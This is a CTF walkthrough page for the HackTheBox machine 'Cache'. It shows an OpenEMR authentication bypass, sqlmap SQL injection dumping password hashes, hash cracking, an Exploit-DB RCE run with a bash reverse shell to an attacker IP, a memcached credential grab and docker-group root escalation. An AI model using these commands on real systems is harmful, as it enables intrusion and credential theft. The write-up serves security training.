@@ -1,0 +1,152 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Cache HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/cache-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-17T19:43:28+00:00">February 17, 2021</time><time class="updated" datetime="2025-06-22T13:09:44+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Cache. It was created by <span style="color: #0000ff;"><strong>ASHacker</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating the Source Code</span></li>
+<li><span style="color: #000000;">Getting the hardcoded credentials</span></li>
+<li><span style="color: #000000;">Crafting dictionary using CeWL</span></li>
+<li><span style="color: #000000;">Fuzzing with the help of WFUZZ</span></li>
+<li><span style="color: #000000;">Editing /etc/host to add virtual host</span></li>
+<li><span style="color: #000000;">Enumerating OpenEMR</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Bypassing Authentication</span></li>
+<li><span style="color: #000000;">Enumerating SQL Error</span></li>
+<li><span style="color: #000000;">Exploiting Error based SQL Injection</span></li>
+<li><span style="color: #000000;">Enumerating password hash from database</span></li>
+<li><span style="color: #000000;">Cracking hash using John the Ripper</span></li>
+<li><span style="color: #000000;">Downloading RCE exploit from searchsploit</span></li>
+<li><span style="color: #000000;">Crafting exploit to get a session</span></li>
+<li><span style="color: #000000;">Getting session as www-data</span></li>
+<li><span style="color: #000000;">Getting session as ash</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating internal services</span></li>
+<li><span style="color: #000000;">Enumerating Memcached Service</span></li>
+<li><span style="color: #000000;">Getting credentials for luffy</span></li>
+<li><span style="color: #000000;">Getting session as luffy</span></li>
+<li><span style="color: #000000;">Enumerating docker containers</span></li>
+<li><span style="color: #000000;">Getting root from docker</span></li>
+<li><span style="color: #000000;">Reading root flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.2.219</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.2.219</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bltJI2gxuO4/YC1tnDNNW9I/AAAAAAAAty0/EN_8sh6jxkA1JBptgSYQ0lTH3rb90KJbACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 22(SSH) and 80(HTTP).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">As we don’t have the SSH credentials, let’s enumerate the HTTP service at first. Then, we open the IP address in our web browser to see an old designed website that teaches hacking.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-BI-TqS1s4yA/YC1ttMCSFJI/AAAAAAAAty4/mVi_p4ewwncgOIVRzEpwz0Fndcw8vc13QCLcBGAsYHQ/s16000/2.png"/></strong></span></p>
+<p><span style="color: #000000;">We see the Login in the left-hand side menu. We click on it; it returns a simple login page with 2 entry fields. One for username and one for password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RyAprXUYx4o/YC1tyWPyjWI/AAAAAAAAty8/cSAsT8XciB4DvLrbZHmOCo5r8E2diNX2wCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We tried entering the username and password to see what kind of error we get. We got 2 prompts. One was username not matched and another was password not match. So, there might be a possibility for Bruteforce usernames and passwords here as we have two different prompts. Before going to Bruteforce, we decided to take a look at the website source code. This is a standard Enumeration procedure. Upon close inspection, we found the functionality.js script. It was something different that took our notice.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wE3RERTe_4w/YC1t4OQ5-XI/AAAAAAAAtzE/dUjvDSy6jtkcR2eEbfwocjlUIkzHQXc4QCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Upon opening the functionality.js, we see that it is a string comparison code and the correct username and password are hardcoded. We took the username ash and password H@v3 fun.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FXWEIeIDmjQ/YC1t8SnDMiI/AAAAAAAAtzI/ajDW9iuIvSIUvNlOrLk54NOMgsH8hIwAQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Here, we entered the username and password that we just extracted into the login form we discovered earlier.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kLsDkj-e6hU/YC1uAyRjsBI/AAAAAAAAtzQ/4ILF44sSfgAZHPteNuTYymTzSMmuB3HdgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h4><span style="color: #000000;">Analyzing OpenEMR</span></h4>
+<p><span style="color: #000000;">We got logged in but there was just an image and site under construction message. This is probably a dead end. We went back to the home page. Tried looking at the author’s page. It mentioned something about the Hospital Management System project being similar to Cache. This must be a hint but at this point we were pretty frustrated and just used the CeWL to craft a dictionary from author.html. Then we performed a Fuzzing attack using wfuzz to find HMS as a possible host.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cewl -w dict.txt http://10.129.2.219/author.html
+wfuzz -hh 8193 -H 'Host: FUZZ.htb' -u http://10.129.2.219/ --hc 400 -2 dict.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jTAMTbo8AM4/YC1uGQW-BbI/AAAAAAAAtzY/GEmKtO7KD44hzae-M0yEO-krhyFXY0pQwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Since it’s a host, we need to add it into our /etc/hosts file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jggB66uAisE/YC1uLI13-AI/AAAAAAAAtzc/kU_5q7HVbLA-NCVxzs1kJRnUx5SoHfLkwCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Now we tried to browse the hms.htb and it shows OpenEMR login page.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://hms.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mkPtejHCq-c/YC1uPMySccI/AAAAAAAAtzk/JrmtL8RonJsZMRGtYmusOzlp2pCuDDZcwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">As the Footer showed the year 2018 that might mean that the version of OpenEMR will be from around the same time. So, we searched on the internet and we found that in 2018 the version 5.0.1 was launched. This must be it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RSNNH3P_Ohk/YC1uVZDe2XI/AAAAAAAAtzs/Iw_4LXV6n-oZWBuM2ruei1U43poC3kSAACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">We searched further to find ourselves that the OpenEMR version before 5.0.1 was subject to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/45161">Remote Code Execution</a></strong></span>. The author of the exploit has provided a video about how to use it as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BuYx0Xy04g8/YC1uavo-GYI/AAAAAAAAtzw/C6zyEXSpO4syi82x3VF5otBiwlm73I2DQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">After studying the exploit for some time, we can conclude that it is not possible to run this exploit without getting the user credentials for the OpenEMR.</span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Enumerating OpenEMR, we found that it is vulnerable to authentication bypass. In this, we basically hit an authenticated URL into the Browser and it redirects to the Patient Login Page but if we go to the Register Page, the Cookie gets changed and the Applications thinks the User is authenticated and gives access to the Authenticated URL. Following this, we register ourselves.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lufbhvr2VMs/YC1ugCC5CdI/AAAAAAAAtz8/uEgcceYnXpwVRew5zLIAjGeTQQ-n2TZ5QCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">After registration, we hit one of the authenticated URL http://hms.htb/portal/add_edit_event_user.php This time we tried to look for some entry point. We started injecting the eid parameter and it generated a Query Error as shown in the image below. This is the Entry point we were looking, for now, we can try to get a SQL Injection Attack going here. Quite possibly an Error based SQL Injection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kYexSzqssA4/YC1ulQkYEfI/AAAAAAAAt0E/9s6QywQ1rZEHM_Zd_0MJKGXJgGAql2AsQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">For that, we need to capture the request in the browser using BurpSuite and then add the contents of the request in a text file. Please ensure that the cookie after registration is there in the request as sqlmap needs it to attack.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RbtuUUjAV4U/YC1upj2vTQI/AAAAAAAAt0I/Kf2OQgIj0BgmFXcke_gPtJHnnspttnD2ACLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">As you can see that we have the request inside the req.txt and then we use this request to test for SQL Injection using sqlmap.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat req.txt
+sqlmap -r req.txt --dbs --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s9r954FSySQ/YC1uuoH_G4I/AAAAAAAAt0Q/Nw_2-Ic920AZCC7kjeG5KEqFr6jkppjnwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">After working for a while, sqlmap gave us a database by the name of openemr.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0sgSDchbszM/YC1uzzPm3eI/AAAAAAAAt0Y/LyjadeR4TB4tpRyAfjOhlfmYG2NIhufawCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Since we have the database name now, we will use it with sqlmap again to enumerate tables.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt -D openemr --tables --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AwPbaEMbxEs/YC1u4rXwe3I/AAAAAAAAt0c/XGTVuAOzk0cTppVi6E7PuAHArt1A-us3ACLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We got a table by the name of users_secure.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8vBVAnvUNRs/YC1u8or0yNI/AAAAAAAAt0k/HNOWFnkjz6ggk-diWl9nUGBSNx06mfBFgCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Since we now have the table name, we will use it with sqlmap again to get the individual entries inside the table. This time we got the password hash of one of the users.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt -D openemr -T users_secure --dump</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_icgh6r3zy8/YC1vCuPBndI/AAAAAAAAt0o/wC6tiVVfqPQqjcq3bWHSlwzm9ZyBacqhwCLcBGAsYHQ/s16000/22.png"/></span></p>
+<h4><span style="color: #000000;">Cracking Credentials</span></h4>
+<p><span style="color: #000000;">We put the hash into a file and then use John the Ripper to crack the hash. It successfully cracks the hash as xxxxxx.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano hash
+john --wordlists=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FgEaS7hu364/YC1vIauXW5I/AAAAAAAAt0w/lJOS52LrT8wGaTuJnJ_U6ukh-63gTZQRQCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the password, we can try to attack the target machine with the Remote Command Execution we found earlier.</span></p>
+<p><span style="color: #000000;">We used the searchsploit to get the exploit to our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit openemr 5.0.1
+searchsploit -m 45161</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TRydHmjooO0/YC1vRBjh8PI/AAAAAAAAt04/MmMUmkkI_SMMiYFXEWhDQnOHOniXLva2wCLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">As it is a python file, we can execute it directly by giving the parameters. We provide the URL for OpenEMR followed by the username and the password we just cracked and finally a shell invocation command that will give us the shell at the port 4444.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python 45161 http://hms.htb -u openemr_admin -p xxxxxx -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.64/4444 0&gt;&amp;1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vUAHpYlTYxg/YC1vWaeYNZI/AAAAAAAAt1A/0h3E8l0f6okGBVpFEFLLZJsJT0vX1a9_ACLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Before starting the exploit, we run a listener at the port 4444. As soon as the exploit gets executed, we get a session on our machine. The session we get is of user www-data. Then, we enumerate for other uses in the home directory, it has 2 other users. ash and luffy. We try to login as ash and we provide the same password we provided earlier. We are able to login as ash user. Now we enumerate for the user flag.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">As a part of enumeration for escalating privileges, we checked for the network sockets related information. This will tell us if there are any services that are configured on the inside. We see that there is something listening on port 11211.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
+id
+cd /home
+python3 -c "import pty;pty.spawn('/bin/bash')"
+su ash
+id
+cat user.txt
+ss -tnl</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iaXZT1G4THs/YC1vbfkRy-I/AAAAAAAAt1E/BR7KN5LHdAY7fDd2CjHZfO4Uqtzo6VTUgCLcBGAsYHQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">We remember from our article on Memcached that port 11211 is a default port for memcached service. This means we can connect it via telnet. We used the get user command to get the username luffy and then used the get passwd command to get the password for luffy user. i.e., 0n3_p1ec3</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet localhost 11211
+get user
+get passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c_-mfULioZY/YC1vf04T1DI/AAAAAAAAt1I/sLUg0MwUL3M0xjt0LcH-usbT0Ahy8KBGACLcBGAsYHQ/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the credentials for the user luffy, we can login as luffy. After logging we ran the id command and found out that we are part of the docker group. Now to get to root from docker is a bit different. For this we need to mount some container. We check for containers using the docker image ls command. This gave us one container and its Image ID. We used this to mount the container. It will make the root files accessible inside the /mnt. We see that we have the root access of the container. We check for the flag and found it with ease. This concludes this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su luffy
+id
+docker image ls
+cd /mnt
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3QF0zOfbXpo/YC1vkBQuKwI/AAAAAAAAt1Q/L0Ic6tc-s1kbYYXZp-2HSFYCuDlk6v8ewCLcBGAsYHQ/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
